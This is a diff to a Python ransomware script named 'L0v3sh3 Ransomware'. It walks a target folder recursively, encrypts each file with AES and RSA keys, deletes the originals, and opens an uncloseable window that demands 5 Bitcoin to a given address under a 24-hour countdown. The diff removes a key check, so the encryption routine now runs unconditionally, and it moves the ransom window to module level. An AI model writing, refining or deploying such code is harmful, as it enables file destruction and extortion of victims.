@@ -10,6 +10,10 @@ from Crypto.Cipher import PKCS1_OAEP, AES
 import tkinter as tk
 from functools import partial
 
+###########################################################################################################################
+#################################################     INITIALIZATIONS     #################################################
+###########################################################################################################################
+
 with open('./media/public.pem', 'rb') as f:
     public = f.read()
 print(base64.b64encode(public))
@@ -18,8 +22,9 @@ print(base64.b64encode(public))
 pubKey = base64.b64encode(public)
 pubKey = base64.b64decode(pubKey)
 
-def scanRecurse(baseDir):
+###########################################################################################################################
 
+def scanRecurse(baseDir):
     for entry in os.scandir(baseDir):
         if entry.is_file():
             yield entry
@@ -91,24 +96,19 @@ def encrypt(dataFile, publicKey):
     os.remove(dataFile)
 
 def encryption_traversal():
-    directory = '~/Desktop/TestFolder/'  # CHANGE THIS
-    excludeExtension = ['.py', '.pem', '.exe']  # CHANGE THIS
-    for item in scanRecurse(directory):
+    for item in scanRecurse(ENCRYPT_FOLDER_PATH):
         filePath = Path(item)
         fileType = filePath.suffix.lower()
 
-        if fileType in excludeExtension:
-	    continue
+        if fileType in EXCLUDED_EXTENSIONS: continue
         encrypt(filePath, pubKey)
 
 def decryption_traversal():
-    directory = '~/Desktop/TestFolder/'  # CHANGE THIS
-    excludeExtension = ['.py', '.pem', '.exe']  # CHANGE THIS
-    for item in scanRecurse(directory):
+    for item in scanRecurse(ENCRYPT_FOLDER_PATH):
         filePath = Path(item)
         fileType = filePath.suffix.lower()
 
-        if fileType in excludeExtension:
+        if fileType in EXCLUDED_EXTENSIONS:
             continue
         decrypt(str(filePath), './media/private.pem')
 
@@ -136,40 +136,39 @@ def countdown(count):
         root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
 
 ###########################################################################################################################
-#################################################     INITIALIZATIONS     #################################################
+
+ENCRYPT_FOLDER_PATH = '/home/aleix/Desktop/TestFolder/'  # CHANGE THIS
+EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
+
+root = tk.Tk()
+def disable_event(): pass
+root.protocol("WM_DELETE_WINDOW", disable_event)
+root.title('L0v3sh3 Ransomware')
+root.geometry('500x300')
+root.resizable(False, False)
+label1 = tk.Label(root, text='All your files have been encrypted! \n\n Please send us 5 Bitcoin to this address:\n\nmkHS9ne12qx9pS9VojpwU5xtRd4T7X7ZUt\n\n', font=('calibri', 12,'bold'))
+label1.pack()
+label = tk.Label(root,font=('calibri', 50,'bold'), fg='white', bg='blue')
+label.pack()
+decrypt_button = tk.Button(root, text='Decrypt', command=decryption_traversal)
+decrypt_button.pack()
+
+# call countdown first time
+countdown('23:59:59')
+# root.after(0, countdown, 5)
+
 ###########################################################################################################################
 
 # Deploys the ransomware
-def encrypt_ransomware(key = None):
-    if type(key) == type(None): return
-    
+def encrypt_ransomware():
     encryption_traversal()
 
-    root = tk.Tk()
-    def disable_event():
-        pass
-    root.protocol("WM_DELETE_WINDOW", disable_event)
-    root.title('L0v3sh3 Ransomware')
-    root.geometry('500x300')
-    root.resizable(False, False)
-    label1 = tk.Label(root, text='All your files have been encrypted! \n\n Please send us 5 Bitcoin to this address:\n\nmkHS9ne12qx9pS9VojpwU5xtRd4T7X7ZUt\n\n', font=('calibri', 12,'bold'))
-    label1.pack()
-    label = tk.Label(root,font=('calibri', 50,'bold'), fg='white', bg='blue')
-    label.pack()
-    decrypt_button = tk.Button(root, text='Decrypt', command=decryption_traversal)
-    decrypt_button.pack()
-
-    # call countdown first time
-    countdown('23:59:59')
-    # root.after(0, countdown, 5)
     root.mainloop()
 
     return
 
 # Deploys the ransomware
 def decrypt_ransomware(key = None):
-    if type(key) == type(None): return
-
     decryption_traversal()
 
     return
